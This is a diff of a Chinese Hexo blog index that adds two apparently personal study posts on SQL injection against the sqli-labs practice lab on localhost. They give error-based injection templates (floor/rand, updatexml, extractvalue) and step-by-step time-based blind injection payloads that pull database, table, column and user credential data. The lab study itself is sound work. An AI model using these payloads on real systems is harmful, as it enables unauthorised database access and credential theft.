@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -155,6 +155,161 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/21/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="归根">
+      <meta itemprop="description" content="浮生若梦">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 归根">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/03/21/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">报错注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-21 23:31:45" itemprop="dateCreated datePublished" datetime="2023-03-21T23:31:45+08:00">2023-03-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-22 00:13:08" itemprop="dateModified" datetime="2023-03-22T00:13:08+08:00">2023-03-22</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>(1). 通过floor报错<br>and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)<br>其中payload为你要插入的SQL语句<br>需要注意的是该语句将 输出字符长度限制为64个字符</p>
+<p>(2). 通过updatexml报错<br>and updatexml(1,payload,1)<br>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
+<p>(3). 通过ExtractValue报错<br>and extractvalue(1, payload)<br>输出字符有长度限制，最长32位。</p>
+<p>以第五关为例<br>*<em><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1%27%20union%20select%20count">http://localhost/sqli-labs-master/Less-5/?id=1%27%20union%20select%20count</a>(</em>),0,concat(0x3a,0x3a,(select%20database()),0x3a,0x3a,floor(rand()<em>2))as%20a%20from%20information_schema.tables%20group%20by%20a%20limit%200,10%20–+</em>* 爆数据库名<br><img src="/images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/1.png"><br>*<em><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=-1&#39;">http://localhost/sqli-labs-master/Less-5/?id=-1&#39;</a> union select count(</em>),1, concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 第几个,第几个后几个),floor(rand()*2)) as a from information_schema.tables group by a–+**爆表名<br><img src="/images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/2.png"><br>**?id&#x3D;-1’ union select count(*),1, concat((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 第几列,第几列后几列),floor(rand()*2)) as a from information_schema.tables group by a–+**爆列名<br>**<br>**?id&#x3D;-1’ union select count(*),1, concat((select concat_ws(‘[‘,列名1,列名2) from users limit 第几列,从第几列后几列),floor(rand()*2)) as a from information_schema.tables group by a–+**爆数据<br><img src="/images/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/3.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/21/sql9-10/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="归根">
+      <meta itemprop="description" content="浮生若梦">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 归根">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/03/21/sql9-10/" class="post-title-link" itemprop="url">sql9-10</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-03-21 23:11:07 / 修改时间：23:29:28" itemprop="dateCreated datePublished" datetime="2023-03-21T23:11:07+08:00">2023-03-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>输入数值发现页面不回显，使用时间注入函数。<br><img src="/images/sql9-10/1.png"><br>**?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+**，验证时间注入<br>2.判断数据库的长度，得到数据库的长度为8<br><strong>?id&#x3D;1’and if(length((select database()))&#x3D;8,sleep(5),1)–+</strong><br>3.判断数据库名字，115为s的ASCII值，依次判断<br><strong>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+</strong><br>4.判断所有表名长度<br><strong>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+</strong></p>
+<p>4.逐一判断表名<br><strong>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&#x3D;99,sleep(5),1)–+</strong></p>
+<p>5.判断所有字段名的长度<br><strong>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+</strong></p>
+<p>6.逐一判断字段名<br><strong>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+</strong></p>
+<p>7.判断字段内容长度<br><strong>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+</strong></p>
+<p>8.逐一查找内容<br><strong>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+</strong></p>
+<p>第十关<br>第十关就是闭合变成双引号了 ，其他是一样的.</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -871,87 +1026,9 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/19/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="归根">
-      <meta itemprop="description" content="浮生若梦">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 归根">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/09/19/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-09-19 21:07:38" itemprop="dateCreated datePublished" datetime="2022-09-19T21:07:38+08:00">2022-09-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 </div>
   </main>
